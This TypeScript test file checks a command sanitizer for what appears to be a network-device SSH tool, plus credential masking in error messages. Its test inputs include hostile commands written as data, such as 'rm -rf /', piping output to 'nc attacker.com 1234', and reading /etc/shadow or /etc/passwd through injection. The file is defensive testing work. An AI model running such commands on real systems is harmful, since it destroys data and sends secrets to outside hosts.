/**
 * Tests for command sanitization and security
 */

// Mock sanitizeCommands function for testing
function sanitizeCommands(commands: string[]): string[] {
  const DANGEROUS_PATTERNS = [
    /\b(rm|del|format|erase)\b/i, // Destructive commands (standalone)
    /\bwrite\s+erase\b/i, // Write erase command
    /&&|;|\||`|\$\(/, // Command chaining
    /\.\.\//, // Path traversal
    /<|>/, // Redirection
  ];

  return commands.map((cmd) => {
    for (const pattern of DANGEROUS_PATTERNS) {
      if (pattern.test(cmd)) {
        throw new Error(`Potentially dangerous command blocked: ${cmd}`);
      }
    }

    const sanitized = cmd.trim();

    if (sanitized.length === 0) {
      throw new Error("Empty command not allowed");
    }

    if (sanitized.length > 1000) {
      throw new Error("Command exceeds maximum length of 1000 characters");
    }

    return sanitized;
  });
}

describe("Command Sanitization", () => {
  describe("Destructive Commands", () => {
    test("should block rm commands", () => {
      expect(() => sanitizeCommands(["show version; rm -rf /"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });

    test("should block erase commands", () => {
      expect(() => sanitizeCommands(["show config; erase startup-config"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });

    test("should block format commands", () => {
      expect(() => sanitizeCommands(["format flash:"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });

    test("should block write erase commands", () => {
      expect(() => sanitizeCommands(["write erase"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });
  });

  describe("Command Injection Prevention", () => {
    test("should block semicolon command chaining", () => {
      expect(() => sanitizeCommands(["show version; cat /etc/shadow"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });

    test("should block && command chaining", () => {
      expect(() => sanitizeCommands(["show version && rm file"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });

    test("should block pipe command chaining", () => {
      expect(() => sanitizeCommands(["show version | nc attacker.com 1234"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });

    test("should block backtick command injection", () => {
      expect(() => sanitizeCommands(["show version `cat /etc/passwd`"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });

    test("should block $() command substitution", () => {
      expect(() => sanitizeCommands(["show $(cat secret)"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });
  });

  describe("Path Traversal Prevention", () => {
    test("should block ../ path traversal", () => {
      expect(() => sanitizeCommands(["cat ../../etc/passwd"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });
  });

  describe("Redirection Prevention", () => {
    test("should block output redirection", () => {
      expect(() => sanitizeCommands(["show version > /tmp/output"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });

    test("should block input redirection", () => {
      expect(() => sanitizeCommands(["command < /etc/passwd"])).toThrow(
        "Potentially dangerous command blocked"
      );
    });
  });

  describe("Valid Commands", () => {
    test("should allow safe show commands", () => {
      const commands = ["show version", "show running-config", "show interfaces brief"];
      const result = sanitizeCommands(commands);
      expect(result).toEqual(commands);
    });

    test("should allow safe configuration commands", () => {
      const commands = ["show system", "show vlan", "show spanning-tree", "show ip ssh"];
      const result = sanitizeCommands(commands);
      expect(result).toEqual(commands);
    });

    test("should trim whitespace", () => {
      const commands = ["  show version  ", "\nshow system\t"];
      const result = sanitizeCommands(commands);
      expect(result).toEqual(["show version", "show system"]);
    });
  });

  describe("Edge Cases", () => {
    test("should reject empty commands", () => {
      expect(() => sanitizeCommands([""])).toThrow("Empty command not allowed");
    });

    test("should reject whitespace-only commands", () => {
      expect(() => sanitizeCommands(["   "])).toThrow("Empty command not allowed");
    });

    test("should reject commands exceeding 1000 characters", () => {
      const longCommand = "show " + "a".repeat(1000);
      expect(() => sanitizeCommands([longCommand])).toThrow("Command exceeds maximum length");
    });

    test("should allow commands at the 1000 character limit", () => {
      const maxCommand = "a".repeat(1000);
      const result = sanitizeCommands([maxCommand]);
      expect(result[0].length).toBe(1000);
    });
  });
});

describe("Credential Sanitization", () => {
  test("should sanitize password in error messages", () => {
    const errorMessage = "Authentication failed: password=SecretPass123";
    const sanitized = errorMessage.replace(/(password|key)[=:]\s*\S+/gi, "$1=***");
    expect(sanitized).toBe("Authentication failed: password=***");
  });

  test("should sanitize key in error messages", () => {
    const errorMessage = "SSH error: key=/path/to/private/key";
    const sanitized = errorMessage.replace(/(password|key)[=:]\s*\S+/gi, "$1=***");
    expect(sanitized).toBe("SSH error: key=***");
  });

  test("should handle multiple credentials in message", () => {
    const errorMessage = "Failed: password=pass123 key=keyfile";
    const sanitized = errorMessage.replace(/(password|key)[=:]\s*\S+/gi, "$1=***");
    expect(sanitized).toBe("Failed: password=*** key=***");
  });
});
